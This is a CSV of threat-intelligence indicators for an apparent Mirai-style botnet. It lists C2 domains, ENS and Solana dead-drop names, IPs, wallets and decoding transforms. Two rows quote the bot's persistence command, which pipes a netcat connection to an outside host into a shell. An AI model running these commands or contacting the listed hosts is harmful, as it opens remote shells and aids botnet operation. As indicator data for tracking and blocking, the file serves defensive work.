domain,c2_method,first_seen,status,notes
www.boatdealers.su,doh_rc4,2025-11,nxdomain,"RC4-encrypted config slot 1; previously 53 A records; NXDOMAIN since 2026-03-19 (LE takedown)"
ida.boatdealers.su,doh_rc4,2025-11,nxdomain,"RC4-encrypted config slot 6; NXDOMAIN; parent domain taken down"
www.gokart.su,doh_rc4,2025-11,nxdomain,"RC4-encrypted config slot 2; previously 54 A records; NXDOMAIN since 2026-03-19 (LE takedown)"
mail.gokart.su,doh_rc4,2025-11,nxdomain,"RC4-encrypted config slot 7; NXDOMAIN; parent domain taken down"
nineeleven.gokart.su,doh_rc4,2025-11,nxdomain,"RC4-encrypted config slot 4; NXDOMAIN; parent domain taken down"
kieranellison.cecilioc2.xyz,doh_rc4,2025-11,unknown,"RC4-encrypted config slot 3; 38 A records as of 2026-03-10; not tested since"
www.sendtuna.com,doh_rc4,2025-11,degraded,"RC4-encrypted config slot 5; contracted from 26 to 2 IPs; no live C2 as of 2026-03-24"
moo.6yd.ru,doh_rc4,2025-11,degraded,"RC4-encrypted config slot 8; 1 A record (5.61.209.96); dead C2; checked 2026-03-24"
dvrip.6yd.ru,doh_rc4,2025-11,nxdomain,"RC4-encrypted config slot 9; NXDOMAIN as of 2026-03-24"
log.6yd.ru,doh_rc4,2025-11,unknown,"RC4-encrypted config slot 10; 1 A record (38.60.179.89); not tested since 2026-03-10"
nodes.ipmoyu.xyz,doh_rc4,2026-03,degraded,"RC4-encrypted config slot 1 in Mar 11+ builds; ~50 A records (fast-flux); 3 live C2 (77.90.63.58/.61/.62) as of 2026-03-24"
www.ipmoyu.xyz,doh_rc4,2026-02,nxdomain,"RC4-encrypted config slot 1 in Feb 2026 builds; NXDOMAIN as of 2026-03-24"
peer.ipmoyu.xyz,doh_rc4,2026-03,degraded,"RC4-encrypted config slot 1 in Mar 9 builds; ~40 A records (fast-flux); no live C2 as of 2026-03-24"
www.plane.cat,doh_rc4,2026-01,degraded,"RC4-encrypted config slot 4 in Jan 2026 builds; contracted to 2 IPs; no live C2 as of 2026-03-24"
ricocaseagainst.rebirth.st,hardcoded_encrypted,2026-03,degraded,"Encrypted config entry in stripped DDoS-only builds; resolves to 158.94.210.71; dead C2; Rebirth stresser branding"
www.jacob-butler.gay,doh_rc4,2026-03,degraded,"Discovered in fast-flux pool March 18; contracted to 2 IPs; no live C2 as of 2026-03-24"
www.richylam.org,doh_rc4,2026-03,nxdomain,"Discovered in fast-flux pool March 18; matches richylam campaign tag; NXDOMAIN since 2026-03-19"
m3rnbvs5d.eth,ens_xor,2026-03-23,active,"ENS C2; text record key 'k1er4n'; IPv6→IPv4 XOR 0xA5; 5 IPs (194.87.198.x + 194.58.38.x); all live 2026-03-24; 'kieran ellison' string in msg+location fields; ETH addr 0x699a...0001"
burrberry.eth,ens_xor,2026-06-22,active,"Tier A ENS dead-drop; text keys route / node / network / quack, each decoded with the 0x80408454 per-octet transform. text[node] rotates: 2026-06-30 = 2001:db8:3b2f:dd18::1 -> 217.60.195.160 (aux C2); 2026-07-27 = 2001:db8:ab9c:5da3::1 -> 93.114.194.75, the /nodes C2 director. 'meowmeowmeow' is not an ENS text key: it is the literal ?key= parameter of GET /nodes?key=meowmeowmeow sent to that director on tcp/9000. Resolver 0xf291...ac15; owner wallet 0x435c (same as ukranianhorseriding.eth); SNS fallback 24carnforth2merseyside.sol"
ukranianhorseriding.eth,ens_xor,2026-03-26,active,"Tier A ENS dead-drop C2; text record keys 'ipv6' (older builds) and 'network'; values are pipe-delimited 2001:db8 pseudo-IPv6 entries decoded with the 0x80408454 per-octet transform, which replaced the earlier static 0xA5 XOR; two live pools, ipv6 = 13 Akamai IPs and network = 14 Akamai/Tencent/Alibaba IPs; resolver 0xf291...ac15 reached over a 9-endpoint public Ethereum RPC pool; name-owner wallet 0x435cf9676ea8a906a51e97012df2a947435f2d7f, same owner as burrberry.eth; still Ethereum ENS as of the 2026-07-12 build c3457390"
meower.eth,ens_plaintext,2026-07-21,active,"Tier B ENS dead-drop C2, used by the i386 build 70f8e194 (campaign telnet.echo); text record key 'ipv4' is plaintext pipe-delimited with no 0x80408454 obfuscation, which is what distinguishes Tier B encoding from Tier A; resolved 2026-07-22 to 172.233.124.230|45.154.98.115, the www.c1s.su pool; rotation from burrberry.eth / ukranianhorseriding.eth; resolver 0xf291...ac15; name-owner wallet 0x45c5DCe717AD0649746fAa3F1Fbd066BcF28cbb4 registered 2026-07-17, distinct from the Tier A owner 0x435cf967... but both funded by 0xc70d9c2f49c46ea41bf8ca8a6f751cdd90988371"
24carnforth2merseyside.sol,sns_txt,2026-05-03,active,"Tier A Solana Name Service fallback C2; TXT record fetched through Bonfida REST proxies (sdk-proxy.sns.id, sns-sdk-proxy.bonfida.workers.dev); returns the same 14 encoded pseudo-IPv6 entries as the ENS 'network' key, using the 0x80408454 transform rather than plaintext; SNS name-owner HouDpVevwgis5FWeYvMFfiCt5cjEkB91rvpnDARkD2fz created 2026-05-01, distinct from the Tier B owner of roanoke.sol and telnet.sol"
roanoke.sol,sns_txt,2026-07-21,active,"Tier B SNS fallback C2 for the i386 build 70f8e194; TXT via Bonfida /record-v2/; rotation from 24carnforth2merseyside.sol; resolved 2026-07-22 to 172.233.124.230|45.154.98.115 in plaintext, the same www.c1s.su pool as meower.eth; SNS name-owner Eevswzwf1hdGK1doSEQ7zAkP6s123AfNArzwD1MD1Wdz, created 2026-07-17 in the same transaction as telnet.sol"
telnet.sol,sns_txt,2026-07-21,active,"Second Tier B SNS fallback name in the i386 build 70f8e194 config; theme matches the telnet.echo campaign tag; Bonfida resolution; same SNS owner as roanoke.sol; TXT resolved 2026-07-22 to 205.237.110.232, the sc.c1s.su delivery and scan-reportback host rather than a DDoS C2 address, which ties the delivery tier into the dead-drop config"
sc.c1s.su,scan_reportback,2026-07-14,active,"garm telnet-scanner report-back host, scanner config slot 1; resolves to 205.237.110.232 (AS25198 INTERKVM HOST SRL) as of 2026-07-14"
tvt.c1s.su,nc_shell_c2,2026-06-23,active,"TVT nc-shell persistence C2 and loader host (busybox nc :4568 | busybox sh, with an ARM7 bot mirror on :80); persistence C2 rotated here from tvt.miraibotnet.su:4568 in the 2026-06-22/23 wave; served loaders 1cf83070 (campaign tvt) and 5be43c1e (campaign tvt.meow) and bot 8abae386"
nvms9000.online,nc_shell_c2,2026-07-21,active,"Tier B nc-shell persistence and loader C2 named in the i386 build 70f8e194 config as 'busybox nc nvms9000.online 9018 | busybox sh'; resolved 162.249.125.140 on 2026-07-21; NVMS9000/TVT lineage, same :9018 port as tvt.oceanic-node.su"
